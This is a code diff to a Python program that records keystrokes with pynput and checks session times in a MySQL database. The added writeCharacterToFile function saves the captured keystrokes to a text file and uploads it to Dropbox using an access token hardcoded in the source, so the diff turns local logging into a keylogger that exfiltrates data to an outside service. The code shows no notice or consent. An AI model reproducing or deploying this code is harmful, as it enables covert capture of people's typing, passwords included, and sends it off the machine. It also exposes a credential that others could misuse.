@@ -1,12 +1,13 @@
 import mysql.connector
 import time
 import os
-import multiprocessing
-from datetime import datetime, date, timedelta
+from datetime import datetime, date
 import threading
 from pynput import keyboard
 from threading import Thread
-
+import dropbox
+from dropbox.files import WriteMode
+from pathlib import Path
 mydb = mysql.connector.connect(
     host='localhost',
     user='root',
@@ -116,21 +117,33 @@ def caculateTime():
 def on_press(key):
     global inputString
     # print(f"Key pressed: {key}")
-    inputString = inputString + str(key) + ' , '
+    inputString = inputString + str(key) + ', '
+
+
+def writeCharacterToFile(inputTime, inputDay, keyboardString):
+    f = open('DataKeyBoard.txt', 'a')
+    f.write(
+        'Day: ' + str(inputDay) + ' Time: ' + inputTime + ' KeyBoard: ' + str(keyboardString.encode('utf-8')) + '\n')
+    Token = 'sl.BACAlYPG-VEauQ4mtvkglcU6kNbfrCbr-VO267rkdHG5p5YZcVp4KseycQVW3Kk8vXylpudMIQzx6-sQBPFwsnP8AdExhqu6rIB-2K5BQltNYuwHvAi-WmtYccSwnBKzVUIYPsxObLVZ'
+    f.close()
+    if os.stat("DataKeyBoard.txt").st_size != 0:
+        dbx = dropbox.Dropbox(Token)
+        with open('DataKeyBoard.txt', 'rb') as file:
+            dbx.files_upload(file.read(), '/upload.txt', mode=WriteMode('overwrite'))
 
 def saveKeyboardhit():
     print('CATCH EVENT KEYBOARD CALL')
     today = date.today()
     now = datetime.now()
     current_time = now.strftime('%H:%M')
-    current_time = datetime.strptime(current_time, '%H:%M')
     with keyboard.Listener(on_press=on_press) as ls:
         def time_out(period_sec: int):
             global inputString
             time.sleep(period_sec)  # Listen to keyboard for period_sec seconds
             if inputString != '':
-                mycusor.execute('insert ManageKeyBoard values(%s, %s, %s)', (today, current_time, inputString))
-                mydb.commit()
+                writeCharacterToFile(str(today), current_time, inputString)
+                # mycusor.execute('insert ManageKeyBoard values(%s, %s, %s)', (today, current_time, inputString))
+                # mydb.commit()
                 inputString = ''
             ls.stop()
         Thread(target=time_out, args=(2.0,)).start()
@@ -141,10 +154,13 @@ def checkData():
     global ETime
     global StartTimeAgain
     print('CHECK DATA CALL')
+    mydb.commit()
     data = getData()
-    if STime != datetime.strptime(data[0][1], '%H:%M') or ETime != datetime.strptime(data[0][2], '%H:%M' or StartTimeAgain != datetime.strptime(data[0][3], '%H:%M')):
+    print(datetime.strptime(data[0][2], '%H:%M'))
+    if STime != datetime.strptime(data[0][1], '%H:%M') or ETime != datetime.strptime(data[0][2], '%H:%M'):
         STime = datetime.strptime(data[0][1], '%H:%M')
         ETime = datetime.strptime(data[0][2], '%H:%M')
+        StartTimeAgain = datetime.strptime(data[0][3], '%H:%M')
         printMessage()
         caculateTime()
 
@@ -157,11 +173,11 @@ def isFinish():
     current_time = now.strftime('%H:%M')
     current_time = datetime.strptime(current_time, '%H:%M')
     distance = ETime - current_time
-    distance = distance / 60
-    if distance <= timedelta(minutes=0):
+    distance = distance.total_seconds() / 60
+    if distance <= 0:
         print('SHUT DOWN')
         exit(0)
-    elif distance <= timedelta(minutes=1):
+    elif distance <= 1:
         caculateTime()
 
 if __name__ == '__main__':
